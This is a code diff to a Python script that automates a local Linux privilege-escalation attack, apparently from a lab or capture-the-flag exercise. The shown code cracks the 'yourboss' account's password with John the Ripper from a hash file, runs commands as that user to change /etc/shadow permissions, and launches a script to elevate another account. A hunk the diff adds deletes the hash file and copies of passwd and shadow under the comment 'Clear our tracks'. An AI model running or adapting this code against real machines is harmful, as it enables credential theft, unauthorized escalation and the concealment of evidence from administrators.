@@ -4,6 +4,7 @@
 
 import crypt
 import io
+import os
 import pexpect
 import subprocess
 import time
@@ -50,14 +51,6 @@ def exec_john_cmd_as_user(user, password, command, delay=True):
         return spawned.read().decode('utf-8')
 
 
-def exec_elevate_cmd_as_user(user, password, command):
-        """ Executes the given command as user. """
-        spawned = pexpect.spawn(command)
-        spawned.expect([pexpect.TIMEOUT, 'password:'], timeout=60*30) # Catch both 'password:' and 'Password:', timeout at 30min (overkill)
-        spawned.sendline(password)
-        print(spawned.read().decode('utf-8'))
-
-
 # We already know tempuser's password
 temp_password = "correctbatteryhorsestaple99"
 
@@ -93,7 +86,7 @@ with open('temp_hash.txt', 'w') as temp_hash:
 
 # Use john to crack the password
 try:
-    exec_john_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt', delay=False)
+    exec_john_cmd_as_user('yourboss', yourboss_cracked, 'john --wordlist=/usr/share/dict/american-english-small temp_hash.txt', delay=True)
     john_dump = exec_cmd_as_user('yourboss', yourboss_cracked, 'john --show temp_hash.txt')
 
     # Clean up john's output
@@ -119,5 +112,11 @@ exec_cmd_as_user('yourboss', yourboss_cracked, 'chmod u=rw,g=r,o= /etc/shadow')
 
 
 # Elevate tempworker
-elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split())
+elevate_process = subprocess.Popen(('./elevate_tempworker.sh ' + yourboss_cracked).split(), shell=False)
+
+
+# Clear our tracks
+os.remove('temp_hash.txt')
+os.remove('/tmp/passwd_copy')
+os.remove('/tmp/shadow_copy')
 
